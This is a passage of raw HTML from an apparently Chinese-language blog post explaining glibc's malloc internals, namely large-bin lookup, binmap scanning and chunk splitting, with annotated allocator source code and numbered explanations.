class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/*&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;    If a large request, scan through the chunks of current bin in&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;    sorted order to find smallest that fits.  Use the skip list for this.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!in_smallbin_range (nb)) &lt;span class=&#34;comment&#34;&gt;//ућ│У»иуџёchunk тюеlarge binУїЃтЏ┤тєЁ&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     bin = bin_at (av, idx);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;comment&#34;&gt;/* skip scan if empty or largest chunk is too small */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;comment&#34;&gt;//тдѓТъюvictimуГЅС║јтц┤Уіѓуѓ╣№╝їУ»┤ТўјbinСИ║уЕ║№╝їтдѓТъют░ЈС║јnbУ»┤ТўјСИЇС╝џТюЅтљѕжђѓуџё&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ((victim = first (bin)) != bin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;         &amp;amp;&amp;amp; (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;) chunksize_nomask (victim)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           &amp;gt;= (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;) (nb))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;         &lt;span class=&#34;comment&#34;&gt;//тЈЇтљЉжЂЇтјєchunk№╝їТЅЙтѕ░уггСИђСИфСИЇт░ЈС║јnbуџёchunk&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;         victim = victim-&amp;gt;bk_nextsize;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;         &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; (((&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;) (size = chunksize (victim)) &amp;lt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                 (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;) (nb)))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           victim = victim-&amp;gt;bk_nextsize;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;         &lt;span class=&#34;comment&#34;&gt;/* Avoid removing the first entry for a size so that the skip&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;            list does not have to be rerouted.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;         &lt;span class=&#34;comment&#34;&gt;//тдѓТъюУ»ЦchunkтњїС╗ќуџёfd chunk СИђТаитцД№╝їт░▒жђЅТІЕfd chunk№╝їжЂ┐тЁЇТћ╣тіеnextsize&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;         &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (victim != last (bin)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             &amp;amp;&amp;amp; chunksize_nomask (victim)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;               == chunksize_nomask (victim-&amp;gt;fd))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           victim = victim-&amp;gt;fd;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;         remainder_size = size - nb;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;         unlink_chunk (av, victim);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;         &lt;span class=&#34;comment&#34;&gt;/* Exhaust */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;         &lt;span class=&#34;comment&#34;&gt;//тдѓТъюУ»Цchunk тЄЈтј╗ nb т░ЈС║ј MINSIZE №╝їт░▒уЏ┤ТјЦУ┐ћтЏъу╗ЎућеТѕи&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;         &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (remainder_size &amp;lt; MINSIZE)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             set_inuse_bit_at_offset (victim, size);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (av != &amp;amp;main_arena)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;               set_non_main_arena (victim);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;         &lt;span class=&#34;comment&#34;&gt;/* Split */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;         &lt;span class=&#34;comment&#34;&gt;//тљдтѕЎ№╝їт░єremainer тіатЁЦ unsorted binСИГ&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;         &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             remainder = chunk_at_offset (victim, nb);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             &lt;span class=&#34;comment&#34;&gt;/* We cannot assume the unsorted list is empty and therefore&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;                have to perform a complete insert here.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             bck = unsorted_chunks (av);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             fwd = bck-&amp;gt;fd;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (__glibc_unlikely (fwd-&amp;gt;bk != bck))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;               malloc_printerr (&lt;span class=&#34;string&#34;&gt;&amp;quot;malloc(): corrupted unsorted chunks&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             remainder-&amp;gt;bk = bck;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             remainder-&amp;gt;fd = fwd;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             bck-&amp;gt;fd = remainder;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             fwd-&amp;gt;bk = remainder;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!in_smallbin_range (remainder_size))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;               &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                 remainder-&amp;gt;fd_nextsize = &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                 remainder-&amp;gt;bk_nextsize = &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;               &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             set_head (victim, nb | PREV_INUSE |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                       (av != &amp;amp;main_arena ? NON_MAIN_ARENA : &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             set_head (remainder, remainder_size | PREV_INUSE);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             set_foot (remainder, remainder_size);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;         check_malloced_chunk (av, victim, nb);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;         &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *p = chunk2mem (victim);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;         alloc_perturb (p, bytes);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;         &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; p;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;РђІ	№╝ѕ10№╝ЅТјЦСИІТЮЦ№╝їУ┐ЏтЁЦтєЁт▒ѓуггС║їСИф for тЙфуј»№╝їТа╣ТЇ« binmap ТЮЦТљюу┤б bin №╝їтЏаСИ║ућ│У»иуџё chunk тцДт░ЈТЅђт»╣т║ћ bin Т▓АТюЅТЅЙтѕ░тљѕжђѓуџё chunk №╝їТЅђС╗Ц№╝їт░▒УдЂС╗јСИІСИђСИф bin т╝ђтДІТљюу┤бсђѓ&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;++idx;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   bin = bin_at (av, idx);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   block = idx2block (idx);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   map = av-&amp;gt;binmap[block];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   bit = idx2bit (idx);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;РђІ	№╝ѕ11№╝ЅтюетєЁт▒ѓуггС║їСИфтЙфуј»тєЁжЃе№╝їт»╗ТЅЙуггСИђСИфСИЇСИ║уЕ║уџё block №╝їтєЇТа╣ТЇ«Т»ћуЅ╣СйЇТЅЙтѕ░тљѕжђѓуџё binсђѓ&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (;; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/*binmapТЋ░у╗ёуџётЁЃу┤ау▒╗тъІТў»unsigned int№╝ї32тњї64СйЇСИђУѕгжЃйТў»4тГЌУіѓ№╝їС╣Ът░▒Тў»32Т»ћуЅ╣№╝їТЅђС╗ЦbinmapуџёСИђСИфblockУЃйтцЪТБђТЪЦ32СИфbin*/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;         &lt;span class=&#34;comment&#34;&gt;/* Skip rest of block if there are no more set bits in this block.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;         &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (bit &amp;gt; &lt;span class=&#34;built_in&#34;&gt;map&lt;/span&gt; || bit == &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             &lt;span class=&#34;keyword&#34;&gt;do&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;               &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                 &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (++block &amp;gt;= BINMAPSIZE) &lt;span class=&#34;comment&#34;&gt;/* out of bins */&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;//тдѓТъюТѕљуФІ№╝їУ»┤ТўјжЂЇтјєС║єТЅђТюЅуџёbinСИћжЃйСИ║уЕ║№╝їтЈфТюЅтї║top chunkСИГт»╗ТЅЙ&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                   &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; use_top;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;               &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ((&lt;span class=&#34;built_in&#34;&gt;map&lt;/span&gt; = av-&amp;gt;binmap[block]) == &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             bin = bin_at (av, (block &amp;lt;&amp;lt; BINMAPSHIFT));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             bit = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;         &lt;span class=&#34;comment&#34;&gt;/* Advance to bin with set bit. There must be one. */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;//ТЅЙтѕ░blockСИЇСИ║уЕ║уџёТюђт░Јуџёbinт»╣т║ћуџёbit&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;         &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ((bit &amp;amp; &lt;span class=&#34;built_in&#34;&gt;map&lt;/span&gt;) == &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             bin = next_bin (bin);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             bit &amp;lt;&amp;lt;= &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             assert (bit != &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;РђІ	№╝ѕ12№╝ЅуёХтљјТБђТЪЦ bit т»╣т║ћуџё bin Тў»тљдСИ║уЕ║№╝їтдѓТъюТў»№╝їт░▒ТИЁуЕ║т»╣т║ћуџё bit СйЇ№╝їС╗јСИІСИђСИф bin т╝ђтДІтЙфуј»№╝їтљдтѕЎт░є Victim С╗ј bin СИГтЈќтЄ║ТЮЦсђѓ&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/* Inspect the bin. It is likely to be non-empty */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;         victim = last (bin);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;         &lt;span class=&#34;comment&#34;&gt;/*  If a false alarm (empty bin), clear the bit. */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;         &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (victim == bin)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             av-&amp;gt;binmap[block] = &lt;span class=&#34;built_in&#34;&gt;map&lt;/span&gt; &amp;amp;= ~bit; &lt;span class=&#34;comment&#34;&gt;/* Write through */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             bin = next_bin (bin);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             bit &amp;lt;&amp;lt;= &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;         &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             size = chunksize (victim);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             &lt;span class=&#34;comment&#34;&gt;/*  We know the first chunk in this bin is big enough to use. */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             assert ((&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;) (size) &amp;gt;= (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;) (nb));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             remainder_size = size - nb;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             &lt;span class=&#34;comment&#34;&gt;/* unlink */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             unlink_chunk (av, victim);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;РђІ	№╝ѕ13№╝Ѕт░єтЈќтЄ║уџё victim У┐ЏУАїтѕЄтѕє№╝їт╣ХТіі remainder тіатЁЦ unsorted bin №╝їтдѓТъю victim СИЇтцЪтѕЄтѕє№╝їт░▒уЏ┤ТјЦУ┐ћтЏъу╗ЎућеТѕи№╝їтєЁт▒ѓуггС║їСИфтЙфуј»тѕ░ТГцу╗ЊТЮЪсђѓ&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span 